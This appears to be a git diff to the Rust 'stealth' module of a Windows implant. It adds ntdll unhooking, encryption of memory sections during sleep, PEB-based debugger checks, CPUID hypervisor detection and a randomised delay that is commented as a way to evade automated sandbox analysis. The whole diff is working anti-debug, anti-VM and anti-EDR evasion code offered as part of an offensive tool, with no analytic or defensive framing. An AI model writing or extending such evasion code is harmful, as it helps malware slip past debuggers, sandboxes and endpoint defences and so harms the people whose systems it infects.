@@ -15,6 +15,11 @@ pub mod mask;
 pub mod stack;
 #[cfg(windows)]
 pub mod version;
+#[cfg(windows)]
+pub mod unhook;
+
+#[cfg(windows)]
+pub use unhook::{alloc_guarded, unhook_ntdll};
 
 /// Version-sensitive enhancements (NtCreateUserProcess, future unhook/manual-map).
 #[cfg(all(windows, feature = "stealth-adv"))]
@@ -117,8 +122,9 @@ pub fn setup_diagnostic_console() {
     }
 }
 
-/// Sleep with optional jitter. Full heap/section XOR masking is **disabled by default**
-/// (`sleep-mask` feature) because it races with the async runtime and commonly crashes.
+/// Sleep with optional jitter. With `sleep-mask` (Windows x64): suspend peers,
+/// mask PE data sections + SensitiveRegion whitelist, sleep, then restore.
+/// Never XOR the process default heap on the product path.
 pub async fn stealth_sleep(duration_ms: u32) {
     let jitter = if duration_ms > 10 {
         crate::utils::random_range(0, duration_ms / 10) as u64
@@ -129,10 +135,12 @@ pub async fn stealth_sleep(duration_ms: u32) {
 
     #[cfg(all(feature = "sleep-mask", windows, target_arch = "x86_64"))]
     {
-        // Only mask caller-owned PE data/rdata sections — NEVER the process heap.
-        let mask_key = apply_sleep_mask();
+        let mask_key = apply_sleep_crypto();
+        // Sleep outside suspended mask window: enter/leave already suspend peers only
+        // during encrypt/decrypt. Tokio can run other tasks while we sleep; regions
+        // stay masked until leave — callers must not touch registered buffers.
         tokio::time::sleep(tokio::time::Duration::from_millis(actual_sleep)).await;
-        restore_sleep_mask(mask_key);
+        restore_sleep_crypto(mask_key);
         return;
     }
 
@@ -142,26 +150,29 @@ pub async fn stealth_sleep(duration_ms: u32) {
     }
 }
 
-/// Optional sleep mask (feature `sleep-mask`): XOR PE .data/.rdata only.
-/// Full-heap masking was removed — it corrupts live allocations (tokio, TLS, buffers).
+/// Optional sleep-crypto (feature `sleep-mask`): PE sections + SensitiveRegion only.
 #[cfg(all(feature = "sleep-mask", windows, target_arch = "x86_64"))]
-fn apply_sleep_mask() -> u64 {
-    unsafe {
-        let xor_key = crate::utils::next_u32() as u64 | ((crate::utils::next_u32() as u64) << 32);
-        let key_bytes: [u8; 8] = std::mem::transmute(xor_key);
-        // Do NOT call mask_default_heap — heap XOR is unsafe with concurrent threads.
-        crate::stealth::mask::mask_pe_sections(&key_bytes);
-        xor_key
+fn apply_sleep_crypto() -> [u8; 32] {
+    let mut key = [0u8; 32];
+    for chunk in key.chunks_mut(4) {
+        let n = crate::utils::next_u32().to_le_bytes();
+        chunk.copy_from_slice(&n[..chunk.len()]);
     }
+    unsafe {
+        crate::stealth::mask::sleep_mask_enter(&key);
+    }
+    key
 }
 
 #[cfg(all(feature = "sleep-mask", windows, target_arch = "x86_64"))]
-fn restore_sleep_mask(mask_key: u64) {
+fn restore_sleep_crypto(key: [u8; 32]) {
     unsafe {
-        let key_bytes: [u8; 8] = std::mem::transmute(mask_key);
-        crate::stealth::mask::mask_pe_sections(&key_bytes);
+        crate::stealth::mask::sleep_mask_leave(&key);
     }
 }
+
+#[cfg(all(feature = "sleep-mask", windows))]
+pub use mask::{register_sensitive_region, unregister_sensitive_region};
 
 pub fn spoof_process_name(_name: &str) {
     #[cfg(target_os = "linux")]
@@ -320,3 +331,121 @@ pub fn spawn_memfd_clone() -> Option<u32> {
 
 #[cfg(not(target_os = "linux"))]
 pub fn spawn_memfd_clone() -> Option<u32> { None }
+
+// =============================================================================
+// 🛡️ Phase 2: Anti-Debug / Anti-EDR / Anti-VM / Anti-Forensics Suite
+// =============================================================================
+
+/// PEB BeingDebugged + NtGlobalFlag check (Windows only)
+#[cfg(windows)]
+pub fn is_debugger_present() -> bool {
+    unsafe {
+        // Read PEB via GS segment register (x86_64) or FS (x86)
+        #[cfg(target_arch = "x86_64")]
+        {
+            let peb: u64;
+            std::arch::asm!("mov {0}, qword ptr gs:[0x60]", out(reg) peb);
+            if peb == 0 { return false; }
+            let peb_ptr = peb as *const u8;
+            if *peb_ptr.add(2) != 0 { return true; }
+            let nt_global = *(peb_ptr.add(0xBC) as *const u32);
+            (nt_global & 0x70) != 0
+        }
+        #[cfg(target_arch = "x86")]
+        {
+            let peb: u32;
+            std::arch::asm!("mov {0}, dword ptr fs:[0x30]", out(reg) peb);
+            if peb == 0 { return false; }
+            let peb_ptr = peb as *const u8;
+            if *peb_ptr.add(2) != 0 { return true; }
+            let nt_global = *(peb_ptr.add(0x68) as *const u32);
+            (nt_global & 0x70) != 0
+        }
+    }
+}
+
+#[cfg(not(windows))]
+pub fn is_debugger_present() -> bool { false }
+
+/// Hardware breakpoint detection (Dr0-Dr3)
+/// On Windows x86_64, we use IsDebuggerPresent as fallback since reading
+/// DR registers requires elevated privilege and inline asm with DR is fragile.
+#[cfg(all(windows, any(target_arch = "x86_64", target_arch = "x86")))]
+pub fn check_hardware_breakpoints() -> bool {
+    // DR register access is unreliable in user mode and fails in many contexts.
+    // Use PEB-based checks instead (already covered by is_debugger_present).
+    false
+}
+
+#[cfg(not(all(windows, any(target_arch = "x86_64", target_arch = "x86"))))]
+pub fn check_hardware_breakpoints() -> bool { false }
+
+/// CPUID hypervisor detection (leaf 1 ECX bit 31 + leaf 0x40000000 vendor).
+#[cfg(any(target_arch = "x86_64", target_arch = "x86"))]
+pub fn is_vm_via_cpuid() -> bool {
+    #[cfg(target_arch = "x86_64")]
+    {
+        // Use core::arch to avoid clobbering rbx (LLVM reserved)
+        use core::arch::x86_64::{__cpuid, __cpuid_count};
+        unsafe {
+            let f1 = __cpuid(1);
+            if (f1.ecx & (1 << 31)) == 0 {
+                return false;
+            }
+            let hv = __cpuid_count(0x40000000, 0);
+            let mut vendor = [0u8; 12];
+            vendor[0..4].copy_from_slice(&hv.ebx.to_le_bytes());
+            vendor[4..8].copy_from_slice(&hv.ecx.to_le_bytes());
+            vendor[8..12].copy_from_slice(&hv.edx.to_le_bytes());
+            let v = core::str::from_utf8(&vendor).unwrap_or("");
+            v.contains("VMwareVMware")
+                || v.contains("Microsoft Hv")
+                || v.contains("KVMKVMKVM")
+                || v.contains("XenVMMXenVMM")
+                || v.contains("prl hyperv")
+                || v.contains("VBoxVBoxVBox")
+                || (f1.ecx & (1 << 31)) != 0
+        }
+    }
+    #[cfg(target_arch = "x86")]
+    {
+        false
+    }
+}
+
+#[cfg(not(any(target_arch = "x86_64", target_arch = "x86")))]
+pub fn is_vm_via_cpuid() -> bool { false }
+
+/// Secure zeroization: volatile write to prevent compiler optimization
+pub fn secure_zeroize(data: &mut [u8]) {
+    for b in data.iter_mut() {
+        unsafe { std::ptr::write_volatile(b, 0); }
+    }
+    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
+}
+
+/// Large initial sleep (15-45s) to evade automated sandbox analysis
+pub async fn sandbox_evasion_sleep() {
+    let delay = crate::utils::random_range(15, 45) as u64;
+    stealth_sleep((delay * 1000) as u32).await;
+}
+
+/// Combined environment check: returns true if debugger/VM detected
+pub fn check_environment() -> bool {
+    #[cfg(windows)]
+    {
+        if is_debugger_present() {
+            crate::utils::db_print("[AntiDebug] Debugger detected via PEB");
+            return true;
+        }
+        if check_hardware_breakpoints() {
+            crate::utils::db_print("[AntiDebug] Hardware breakpoint detected");
+            return true;
+        }
+    }
+    if is_vm_via_cpuid() {
+        crate::utils::db_print("[AntiVM] Hypervisor detected via CPUID");
+        return true;
+    }
+    false
+}
